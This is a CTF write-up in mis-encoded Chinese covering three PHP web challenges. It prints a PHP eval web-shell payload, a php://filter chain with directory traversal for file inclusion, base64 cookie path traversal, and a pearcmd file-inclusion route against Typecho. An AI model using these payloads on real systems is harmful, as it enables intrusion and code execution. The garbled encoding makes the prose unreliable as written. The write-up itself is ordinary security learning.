&lt;p>‚Äî‚Äî‚Äî‚ÄîÁî±‰∫éÊàëÁöÑjavaÊ∞¥Âπ≥ÂÆûÂú®Â§üÂëõÔºåËøôÈáåÊöÇÊó∂ÂÖàÁ©∫ÁùÄÔºåÁ≠âÊàëÂ≠¶‰∏ÄÂ≠¶java ‰πãÂêéÂøÖÂÆöÂõûÊù•Èû≠Â∞∏&lt;/p>
&lt;h2 id="easyfilter">EasyFilter&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;open_basedir&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;./&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;w&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#75af00">mkdir&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;c&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">bin2hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#75af00">file_put_contents&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$content&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">elseif&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;action&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;span style="color:#111">$r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#111">$file&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;./files/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$r&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">include&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;php://filter/resource=&lt;/span>&lt;span style="color:#d88200">$file&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?action=w&amp;amp;c=&amp;lt;?php @eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>/?action=r&amp;amp;r=php://filter/read=convert.base64-decode/resource=/../../../../../files/f8b3731ac9
POST: wuhu=phpinfo();
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023214748589.png" alt="image-20211023214748589">&lt;/p>
&lt;h3 id="ÂØπ‰∫épayloadÁöÑÂ∫ïÂ±Ç‰ª£Á†ÅÂàÜÊûê">ÂØπ‰∫épayloadÁöÑÂ∫ïÂ±Ç‰ª£Á†ÅÂàÜÊûê&lt;/h3>
&lt;p>ÂéüÁêÜÂàÜÊûêÊù•Ëá™Guoke‰Ω¨ ÊàëÂè™ÊòØ‰∏™‰ºöÂ§çÁé∞ÁöÑÈìÅÊ≤∏Áâ©‚Ä¶‚Ä¶&lt;/p>
&lt;p>È¶ñÂÖà‰∏ã‰∏Ä‰ªΩ7.2.34ÁöÑÊ∫êÁ†Å&lt;/p>
&lt;p>ÂÆö‰ΩçÂà∞ÂåÖË£ÖÂô®ÊâÄÂú®ÁöÑÊñá‰ª∂‰ΩçÁΩÆ/ext/standard/php_fopen_wrapper.cÔºå178Ë°åËµ∑ÊòØphp_stream_url_wrap_php()ÁöÑ‰ª£Á†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210116402.png" alt="image-20211024210116402">&lt;/p>
&lt;p>191Ë°åÔºåÂÖàÁ¢∞Âà∞&lt;code>php://&lt;/code>‰ºöÊâßË°å&lt;code>path += 6&lt;/code>Ôºõ‰πãÂêéÊé•ÁùÄ349Ë°å‰ºöÁ¢∞Âà∞&lt;code>filter/&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024210420398.png" alt="image-20211024210420398">&lt;/p>
&lt;p>Ê≤°ÊúâmodeÔºåÊ≠§Êó∂&lt;/p>
&lt;pre tabindex="0">&lt;code>path=filter/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>357Ë°åÊâßË°åstrdup()ÔºåÊääpathÁ¨¨6‰Ωç‰πãÂêéÁöÑÂÜÖÂÆπËµãÁªôpathdupÊåáÈíà‰∏ä&lt;/p>
&lt;pre tabindex="0">&lt;code>pathdup=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>358Ë°åstrstr()ËøîÂõûpathdupÁöÑÊåáÈíà‰∏≠/resource=Âá∫Áé∞ÁöÑ‰ΩçÁΩÆÔºåÂà∞365Ë°åÁöÑÂà§Êñ≠&lt;/p>
&lt;pre tabindex="0">&lt;code>p+10=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>372Ë°åÁöÑphp_strtok_r()ÂØπpathdup+1ÁöÑ‰ΩçÁΩÆ‰ª•'/&amp;lsquo;‰∏∫Ê†áÂøóËøõË°åÂàÜÂâ≤&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/resource=./files/php://filter/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>ÂæóÂà∞resource=ÔºåËøõ373Ë°åÁöÑwhileÂæ™ÁéØÔºåÂÖàÊòØÂà∞378Ë°åÁöÑphp_stream_apply_filter_list()ÔºåËΩ¨Ëá≥159Ë°å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024230730886.png" alt="image-20211024230730886">&lt;/p>
&lt;p>Â∞Üp‰Ωú‰∏∫ËøáÊª§Âô®ËøõË°åÊ≥®ÂÜåÔºå161Ë°åphp_stream_filter_append()Â∫îÁî®Âà∞Êñá‰ª∂ÊµÅ‰∏äÔºå‰ΩÜÊòæÁÑ∂resource‰∏çÊòØÊµÅÂåÖË£ÖÂô®ÔºåÂπ≤‰∏ç‰∫Ü‰∫ãÔºåÈÇ£Â∞±ÂÜçÂà∞whileÂæ™ÁéØÈáåÊé•ÁùÄÂêëÂêéÊâæÔºåÁõ¥Âà∞ÂêëÂêéÁ¢∞Âà∞read&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>ËøõÂÖ•374Ë°åÔºåÊâßË°åphp_stream_apply_filter_list‰πãÂêéÂ∞±ÂèòÊàê‰∫Ü&lt;/p>
&lt;pre tabindex="0">&lt;code>p=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>Ê≠§Êó∂ÁöÑp=convert.base64-decodeÔºåÂ∞±ÂèØ‰ª•Ê≠£Â∏∏ÁöÑb64Ëß£Á†ÅÊàë‰ª¨ÁöÑÂÜÖÂÆπ‰∫Ü&lt;/p>
&lt;h3 id="ÂÜçÂõûÂ§¥ÁúãËøô‰∏™È¢ò">ÂÜçÂõûÂ§¥ÁúãËøô‰∏™È¢ò&lt;/h3>
&lt;p>‰ª£Á†ÅÂæàÁü≠ÔºåÈôêÂà∂Âú®‰∫éÂÜôÂÖ•ÁöÑÊñá‰ª∂ÂÜÖÂÆπË¢´b64Âä†ÂØÜ&amp;amp;open_basedir&amp;amp;includeÂ∑≤ÁªèÂÜôÂ•ΩÁöÑÂåÖË£ÖÂô®Âíå‰∏ÄÈÉ®ÂàÜÂõ∫ÂÆöÁöÑÂÜÖÂÆπ&lt;/p>
&lt;p>ÊàëÂàöÂºÄÂßãÂç°Âú®‰∫ÜÂ∑≤ÁªèÂÜôÊ≠ªÁöÑÂåÖË£ÖÂô®ÁöÑÂºÄÂ§¥ËøòÊÄé‰πàÂä†conver.base64-decodeÔºüÁÑ∂ÂêéÂèëÁé∞ÊòØÊàëÊÉ≥Â§ö‰∫ÜÔºåÂèØ‰ª•Êé•ÁùÄÂ•óÔºåÂ∫ïÂ±ÇÂéüÁêÜËßÅ‰∏äÔºå‰ºöÂêëÂêéÂæ™ÁéØÂèñÂÄºÁõ¥Âà∞Á¢∞Âà∞‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑÊµÅÂåÖË£ÖÂô®&lt;/p>
&lt;p>Á¨¨‰∫å‰∏™ÈóÆÈ¢òÂ∞±ÊòØÁõÆÂΩïÁ©øË∂ä‰∫ÜÔºåÂâçÈù¢Âä†‰∫Ü5Â±ÇbuffÔºå‰ªéÁªìÊûúÂÄíÊé®ÊÑüËßâÂèØ‰ª•ÁêÜËß£Ôºå‰ΩÜÊòØËá™Â∑±Âç¥Ê≤°ËØïÂá∫Êù•ÔºåÊàëÁöÑÈóÆÈ¢ò&lt;/p>
&lt;p>ÊúÄÂêéopen_basedirÁöÑÁªïËøáÂèçËÄåÊòØÊúÄËΩªÊùæÁöÑÔºåËöÅÂâëÊèí‰ª∂Áõ¥Êé•Êêû&lt;/p>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://www.laruence.com/2010/05/04/1450.html">Ê∑±ÂÖ•ÁêÜËß£PHP‰πãrequire/includeÈ°∫Â∫è&lt;/a> | &lt;a href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols / Wrappers&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">Ë∞à‰∏ÄË∞àphp://filterÁöÑÂ¶ôÁî®&lt;/a>&lt;/p>
&lt;h2 id="new_hospital">new_hospital&lt;/h2>
&lt;p>ÂìçÂ∫îcookie‰ºöÊúâ‰∏™API&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023225411779.png" alt="image-20211023225411779">&lt;/p>
&lt;p>Â∞ÜAPIËÆæ‰∏∫flag.php &lt;code>ZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230544476.png" alt="image-20211023230544476">&lt;/p>
&lt;p>Êâ´ÁõÆÂΩï ÂæóÂà∞/old/feature.php Â∞ÜË∑ØÂæÑÊîπ‰∏∫Ëøô‰∏™&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230842820.png" alt="image-20211023230842820">&lt;/p>
&lt;p>Â∞ÜAPIÊîπ‰∏∫../flag.php &lt;code>Li4vZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230912588.png" alt="image-20211023230912588">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂÖ∂ÂÆûÂ¶ÇÊûúÂÖàÊâ´ÁõÆÂΩïÊâ´Âà∞/old/feature.phpÁöÑËØùÔºåÂèØ‰ª•Â∞ÜAPIËÆæ‰∏∫./feature.php &lt;code>Li9mZWF0dXJlLnBocA%3d%3d&lt;/code> ËØªÂà∞Ëøô‰∏ÄÊÆµ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023231112340.png" alt="image-20211023231112340">&lt;/p>
&lt;p>ÂêéÁ´ØÁöÑÈÄªËæëÂ∞±ÊòØÂ∞Ücookie[&amp;lsquo;api&amp;rsquo;]ÂèñÂá∫ÔºåÁõ¥Êé•ËØªÂá∫ÂÜÖÂÆπ&lt;/p>
&lt;p>Êúâ‰∏ÄÁÇπÁÇπËÑëÊ¥ûÔºå‰πüË∑üÁúºÂäõËßÅÊúâÂÖ≥Á≥ªÔºåÊàë‰∏ÄÂºÄÂßãÊòØÁúüÊ≤°Ê≥®ÊÑèÂà∞Ëøô‰∏™cookieÁöÑAPIÂ≠óÊÆµÔºåÂ±ûÂÆûÊòØÊúâÁÇπÂ§ßÁóÖÔºõ‰πãÂêéÂÅöÈ¢òËøòÊòØË¶ÅÂºÄÁéØÂ¢É‰πãÂêéÂ∞±ËøûburpÔºåÊ≥®ÊÑèËßÇÂØüÂìçÂ∫îÂ§¥ÁöÑÁâπÊÆäÂ≠óÊÆµ cookieÁöÑÁ±ªÂûã/ctrl+uÁöÑÊ∫êÁ†Å/ÂèØËÉΩ‰ºöÊúâÁöÑÊéßÂà∂Âè∞ÁöÑÊèêÁ§∫‰ø°ÊÅØ/robots.txtËøô‰∫õ‰∏úË•øÔºå‰∏çË¶ÅÈÅóÊºèÔºå‰∏çÁÑ∂Â∞±ÂæàÂèØÊÉú‰∫Ü&lt;/p>
&lt;h2 id="give_me_you_0day">Give_me_you_0day&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023131341209.png" alt="image-20211023131341209">&lt;/p>
&lt;p>ËøôÈáåËÄÉÂØüÁöÑÁÇπÂπ∂‰∏çÊòØTypecho 1.1/17.10.30ÁâàÊú¨ÁöÑ0dayÔºàÁªôÂá∫ÁöÑÊ∫êÁ†ÅÂ∞±ÂÆåÂÖ®ÊòØgithub‰∏äÁöÑÂèëË°åÁâàÔºâÔºåËÄåÊòØinstall.php‰∏≠ 608Ë°åÂ≠òÂú®‰∏Ä‰∏™Êñá‰ª∂ÂåÖÂê´&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023233205364.png" alt="image-20211023233205364">&lt;/p>
&lt;p>Âà©Áî®Ëøô‰∏™Êñá‰ª∂ÂåÖÂê´ÁöÑÁÇπÊù•ÊêûÔºåpayloadÂèØ‰ª•Áõ¥Êé•ÂèÇËÄÉ&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030247104.png" alt="image-20211024030247104">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024025903697.png" alt="image-20211024025903697">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030018830.png" alt="image-20211024030018830">&lt;/p>
&lt;p>ÊâìÁöÑÁÇπÂú®‰∫épeclcmdÔºåËøôÈáåÊ∂âÂèäÂà∞ÁöÑÈ¢òÂíåÁü•ËØÜÂÆ≥Êå∫Â§öÔºå‰πãÂâçÁúüÊ≤°ËßÅËøáÔºàdbqÊòØÊàëÂÅöÁöÑÈ¢òÂ§™Â∞ëÂ§™Â∞ë‰∫ÜÔºâÔºåÂú®ËøôÈáå‰∏ÄÂπ∂Â≠¶‰π†‰∫Ü&lt;/p>
&lt;h3 id="ÂÖ≥‰∫éregister_argc_argvÈÖçÁΩÆÈ°π">ÂÖ≥‰∫é&lt;code>register_argc_argv&lt;/code>ÈÖçÁΩÆÈ°π&lt;/h3>
&lt;p>ÊòØphp.iniÊ†∏ÂøÉÈÖçÁΩÆ‰∏≠ÁöÑ‰∏Ä‰∏™ÈÄâÈ°πÔºåÈªòËÆ§ÊòØËøôÊ†∑&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024002824679.png" alt="image-20211024002824679">&lt;/p>
&lt;p>&lt;a href="https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv">ÊâãÂÜå&lt;/a>ÊòØËøôÊ†∑ÂÜôÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000219559.png" alt="image-20211024000219559">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000145606.png" alt="image-20211024000145606">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000543235.png" alt="image-20211024000543235">&lt;/p>
&lt;p>‰ªéphp=4.0.0Âêé‰∏∫ÂèØËÆæÁΩÆÁöÑÈÄâÈ°πÔºàÊ≠§ÂâçÊÄª‰∏∫OnÔºâÈªòËÆ§‰∏∫ÂºÄÂêØÁä∂ÊÄÅÔºåÂΩìphp&amp;lt;=4.2.3Êó∂ÂèØ‰øÆÊîπËåÉÂõ¥ÊòØ&lt;code>PHP_INI_ALL&lt;/code>ÔºåÊõ¥ËØ¶ÁªÜÁöÑÂÜÖÂÆπÂèØ‰ª•ÂèÇËßÅ-&amp;gt;&lt;a href="http://ms7.fhsh.tp.edu.tw/php5c/features.commandline.html">PHPÁöÑÂëΩ‰ª§Ë°åÊ®°Âºè&lt;/a>&lt;/p>
&lt;p>Âú®&lt;code>register_argc_argv&lt;/code>ÂºÄÂêØÁöÑÊÉÖÂÜµ‰∏ãÔºåcgiÂíåcliÊ®°Âºè‰∏ãÈÉΩÂèØ‰ª•Áõ¥Êé•ËÆøÈóÆÂà∞‰º†ÂÖ•ÁöÑÂèÇÊï∞ÔºõÂÖ∂‰∏≠argcÊòØ‰º†ÈÄíËøáÂéªÁöÑÂèÇÊï∞ÁöÑ‰∏™Êï∞ÔºåargvÊòØÂåÖÂê´ÊúâÂÆûÈôÖÂèÇÊï∞ÁöÑÊï∞ÁªÑÔºõcliÊ®°ÂºèÊµãËØïÂ¶Ç‰∏ã&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75715e">// var_dump($HTTP_SERVER_VARS[&amp;#39;argv&amp;#39;]);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003201497.png" alt="image-20211024003201497">&lt;/p>
&lt;p>cgiÁöÑËØùÔºåÁõ¥Êé•Áî®‰∏äÈù¢ÁöÑ&lt;code>$_SERVER['argv']&lt;/code>ÊòØ‰∏ç‰ºöËé∑ÂèñÂà∞ÂÄº&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003801051.png" alt="image-20211024003801051">&lt;/p>
&lt;p>Áõ¥Êé•Êü•Áúã$_SERVERËøô‰∏™Â§ßÊï∞ÁªÑÔºåÂèØ‰ª•ÂèëÁé∞Êàë‰ª¨ÁöÑÂèÇÊï∞Âú®ËøôÈáåÊòØ‰ª•‰∏ÄÊï¥‰∏™QUERY_STRINGÁöÑÂΩ¢ÂºèÂá∫Áé∞ÁöÑÔºàËØ¶ÁªÜÁöÑÊï∞ÁªÑËß£Êûê-&amp;gt;&lt;a href="https://www.feiniaomy.com/post/274.html">PHPË∂ÖÂÖ®Â±ÄÂèòÈáè$_SERVERÁöÑÁî®Ê≥ï&lt;/a>Ôºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024012150841.png" alt="image-20211024012150841">&lt;/p>
&lt;p>Êúâ‰∏™ÁâπÊÆäÁöÑtrickÂú®‰∫éÔºåÂ¶ÇÊûúÊòØ&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1&amp;amp;b=1
&lt;/code>&lt;/pre>&lt;p>Á°ÆÂÆûÊòØ‰∏§‰∏™ÂèÇÊï∞Ôºå‰ΩÜËøîÂõûÁöÑ$_SERVER[&amp;lsquo;argv&amp;rsquo;]‰∏∫1ÔºåÂ¶ÇÊûúÊòØ&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1+b=1
&lt;/code>&lt;/pre>&lt;p>Âàô‰ºöË¢´Êà™Êñ≠ÔºåËøîÂõû$_SERVER[&amp;lsquo;argv&amp;rsquo;]Âàô‰∏∫2ÔºàËØ¥ÂÆûËØùÊàëÊú¨Âú∞ÁúüÊ≤°Ë∑ëÂá∫Êù•Ëøô‰∏™ ÂèØËÉΩÊòØÂì™ÈáåÁöÑÈÖçÁΩÆÊúâÈóÆÈ¢òÔºü‰ΩÜÊòØÁúã‰∫ÜÂæàÂ§öËµÑÊñôÔºåËøôÈáåÂ∫îËØ•ÊòØÂèØ‰ª•Ë¢´Â§çÁé∞ÊàêÂäüÁöÑ‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶emmmm Êúâ‰∏ÄÁÇπÁÇπÁ¶ªË∞±Ôºâ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020719209.png" alt="image-20211024020719209">&lt;/p>
&lt;h3 id="ÂÖ≥‰∫épearÂëΩ‰ª§">ÂÖ≥‰∫é&lt;code>pear&lt;/code>ÂëΩ‰ª§&lt;/h3>
&lt;p>pearÊòØ&lt;em>the PHP Extention and Application Repository&lt;/em>ÁöÑÁº©ÂÜôÔºåÊòØ‰∏Ä‰∏™PHPÊâ©Â±ï‰∏éÂ∫îÁî®ÁöÑ‰ª£Á†Å‰ªìÂ∫ìÔºåpear‰ªìÂ∫ì‰ª£Á†Å‰ª•ÂåÖ&lt;em>package&lt;/em>ÂàÜÂå∫ÔºåÊØè‰∏Ä‰∏™&lt;em>pear package&lt;/em>ÈÉΩÊòØ‰∏Ä‰∏™Áã¨Á´ãÁöÑÈ°πÁõÆÔºåÊúâËá™Â∑±Áã¨Á´ãÁöÑÂºÄÂèëÂõ¢Èòü„ÄÅÁâàÊú¨ÊéßÂà∂„ÄÅÊñáÊ°£ÂíåÂÖ∂‰ªñÂåÖÁöÑ‰æùËµñÂÖ≥Á≥ª‰ø°ÊÅØÔºõ&lt;em>pear package&lt;/em>‰ª•phar, tar, zipÂΩ¢ÂºèÂèëÂ∏ÉÔºåÈÄöËøá&lt;code>apt install php-pear&lt;/code>Êù•ÂÆâË£Ö&lt;/p>
&lt;p>pearÂëΩ‰ª§ÁöÑÂÆûÁé∞ÊòØ‰∏Ä‰∏™shËÑöÊú¨&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/sh
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e"># first find which PHP binary to use&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_bin&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>php
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#75715e"># then look for the right pear include dir&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
